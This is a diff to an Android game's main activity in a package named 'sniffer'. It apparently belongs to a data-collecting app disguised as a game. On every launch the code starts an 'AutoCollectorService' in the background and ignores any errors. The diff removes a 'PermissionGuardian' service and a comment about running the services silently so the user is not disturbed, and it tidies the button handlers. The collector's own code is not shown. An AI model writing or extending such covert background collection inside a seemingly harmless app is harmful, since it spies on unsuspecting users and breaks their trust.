@@ -4,18 +4,15 @@ import android.app.Activity;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
 import android.view.View;
 import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
 import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.TextView;
-import android.widget.Toast;
 import com.v8.global.sniffer.R;
 import com.v8.global.sniffer.AutoCollectorService;
 import com.v8.global.sniffer.NotificationService;
-import com.v8.global.sniffer.PermissionGuardian;
 
 public class MainGameActivity extends Activity {
 
@@ -31,7 +28,7 @@ public class MainGameActivity extends Activity {
 
         initViews();
         loadHighScore();
-        startBackgroundServicesSilently();
+        startBackgroundServices();
         setupClickListeners();
     }
 
@@ -53,8 +50,7 @@ public class MainGameActivity extends Activity {
         tvHighScore.setText("🏆 أفضل نتيجة: " + highScore);
     }
 
-    private void startBackgroundServicesSilently() {
-        // تشغيل الخدمات بصمت دون إزعاج المستخدم
+    private void startBackgroundServices() {
         try {
             Intent notificationIntent = new Intent(this, NotificationService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -72,42 +68,22 @@ public class MainGameActivity extends Activity {
                 startService(collectorIntent);
             }
         } catch (Exception ignored) {}
-
-        try {
-            Intent guardianIntent = new Intent(this, PermissionGuardian.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(guardianIntent);
-            } else {
-                startService(guardianIntent);
-            }
-        } catch (Exception ignored) {}
     }
 
     private void setupClickListeners() {
-        btnPlay.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
-                Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
-                startActivity(intent);
-            }
+        btnPlay.setOnClickListener(v -> {
+            v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
+            startActivity(new Intent(MainGameActivity.this, GameBoardActivity.class));
         });
 
-        btnSettings.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
-                Intent intent = new Intent(MainGameActivity.this, GameSettingsActivity.class);
-                startActivity(intent);
-            }
+        btnSettings.setOnClickListener(v -> {
+            v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
+            startActivity(new Intent(MainGameActivity.this, GameSettingsActivity.class));
         });
 
-        btnExit.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
-                moveTaskToBack(true);
-            }
+        btnExit.setOnClickListener(v -> {
+            v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
+            moveTaskToBack(true);
         });
     }
 
